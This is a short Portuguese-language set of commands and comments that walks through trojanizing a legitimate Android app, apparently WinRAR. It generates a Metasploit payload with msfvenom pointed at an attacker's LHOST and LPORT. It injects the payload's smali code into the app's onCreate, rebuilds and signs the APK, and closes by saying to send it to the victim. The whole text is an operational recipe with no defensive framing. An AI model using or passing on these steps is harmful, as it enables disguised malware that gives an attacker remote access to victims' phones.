/*Ingeção do código maliciosso em apps legitimos
 para android
 *
 *Usado o app winrar.apk
 */

apktool d <app.apk> // Desempacota o apk - debulding, ira gerar uma pasta 

//Criaçaõ do app malicioso || -a arquitetura | -platform plataforma | -p payload | -f tipo do arquivo | -o nome do arquivo
msfvenom -a dalvik --platform android -p <nome_payload> LHOST <ipdoserver> LPORT <porta_conc> -f raw -o <app_mal.apk> 

apktool d <app_mal.apk> // Desempacota o apk - debulding

// Criar um diretorio
cd <app.akk>/smali/com/
mkdir -p metasploit/stage

// Copia o arquivo Payload.smali
cp <app_mal.apk>/smali/com/metasploit/stage/Payload.smali /<app.akk>/smali/com/metasploit/stage

// editar o arquivo MainActivity.smali (do app original) procurar a lina com " ;->onCreate " e adicionar esse codigo
    
invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

// editar o AndroidManifest.xml (do app original) com as permissoes necessarias

apktool b app/ // Compilar o app, agora infectado (pode dar erro use uma versão mais recente do apktool)
java -jar apktool_2.4.0.jar b app/

/---------------------------------------------------------------------------------------------------/
// Assinar o apk (realizar na pasta app/dist/)

// Criação da chave
keytool -genkey -v -keystore debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000

// Assinando o apk
jarsigner -verbose -keystore debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA winrar.apk androiddebugkey

// Agora é enviar o apk para a vitima





